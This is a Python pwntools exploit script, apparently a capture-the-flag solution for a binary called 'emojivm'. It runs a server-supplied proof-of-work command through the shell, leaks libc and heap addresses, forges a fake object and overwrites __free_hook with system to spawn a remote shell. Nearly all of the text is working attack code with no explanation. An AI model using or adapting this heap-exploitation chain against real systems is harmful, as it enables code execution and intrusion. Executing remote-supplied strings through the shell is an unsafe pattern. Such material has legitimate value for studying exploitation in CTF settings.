#!/usr/bin/env python

from pwn import *
import itertools, string, hashlib, sys, time

HOST = "3.115.176.164"
PORT = 30262
ELF_PATH = "./emojivm"
LIBC_PATH = "./libc.so.6"

context.binary = ELF_PATH
context.log_level = 'INFO' # ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.terminal = ['tmux', 'splitw'] # for gdb.attach

elf = context.binary # context.binary is an ELF object
libc = elf.libc if not LIBC_PATH else ELF(LIBC_PATH)
if not libc: log.warning("Failed to load libc")

def POW():
    r.recvuntil("token:\n")
    cmd = r.recvline().strip()
    token = subprocess.check_output(cmd, shell=True).strip()
    log.success("token: {}".format(token))
    r.sendline(token)

def send(payload):
    r.send(payload)
    time.sleep(0.5)

if __name__ == "__main__":

    r = remote(HOST, PORT)
    # r = process("./local_run.sh")
    # POW & send emoji file
    POW()
    emo = open(sys.argv[1], "rb").read()
    sz = len(emo)
    assert sz <= 1000
    log.success("file size: {}".format(sz))
    r.sendlineafter("size:", str(sz))
    r.sendafter("file:", emo)
    r.recvline()
    # leak 
    libc.address = u64(r.recv(6).ljust(8, "\x00")) - 0x3e7d60
    heap = u64(r.recv(6).ljust(8, "\x00")) - 0x17b40
    log.success("libc: {:#x}".format(libc.address))
    log.success("heap: {:#x}".format(heap))
    # forge a fake gptr obj
    payload = p64(0x100) + p64(heap + 0x13868)
    send(payload)
    # modify gptr[0], let its data buffer point to __free_hook 
    payload = p64(8) + p64(libc.symbols.__free_hook)
    send(payload)
    # modify gptr[0]->buf (free_hook) to system 
    send(p64(libc.symbols.system))
    # modify gptr[1]->buf to "sh"
    send("sh")
    # get shell !
    r.interactive()
